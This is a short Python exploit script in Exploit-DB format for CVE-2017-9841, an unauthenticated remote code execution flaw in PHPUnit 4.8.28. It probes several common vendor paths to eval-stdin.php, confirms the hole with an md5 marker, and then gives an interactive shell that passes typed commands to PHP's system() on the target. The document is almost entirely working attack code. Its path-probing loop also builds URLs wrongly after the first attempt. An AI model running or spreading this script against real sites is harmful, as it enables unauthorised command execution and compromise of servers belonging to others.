# Exploit Title: PHP Unit 4.8.28 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2022/01/30
# Exploit Author: souzo
# Vendor Homepage: phpunit.de
# Version: 4.8.28
# Tested on: Unit
# CVE : CVE-2017-9841

import requests
from sys import argv

phpfiles = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]


def check_vuln(site):
    vuln = False
    try:
        for i in phpfiles:
            site = site + i
            req = requests.get(site, headers={
                "Content-Type": "text/html",
                "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            }, data="<?php echo md5(phpunit_rce); ?>")
            if "6dd70f16549456495373a337e6708865" in req.text:
                print(f"Vulnerable: {site}")
                return site
    except:
        return vuln


def help():
    exit(f"{argv[0]} <site>")


def main():
    if len(argv) < 2:
        help()
    if not "http" in argv[1] or not ":" in argv[1] or not "/" in argv[1]:
        help()
    site = argv[1]
    if site.endswith("/"):
        site = list(site)
        site[len(site) - 1] = ''
        site = ''.join(site)

    pathvuln = check_vuln(site)
    if pathvuln == False:
        exit("Not vuln")
    try:
        while True:
            cmd = input("> ")
            req = requests.get(str(pathvuln), headers={
                "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
                "Content-Type": "text/html"
            }, data=f'<?php system(\'{cmd}\') ?>')
            print(req.text)
    except Exception as ex:
        exit("Error: " + str(ex))


main()
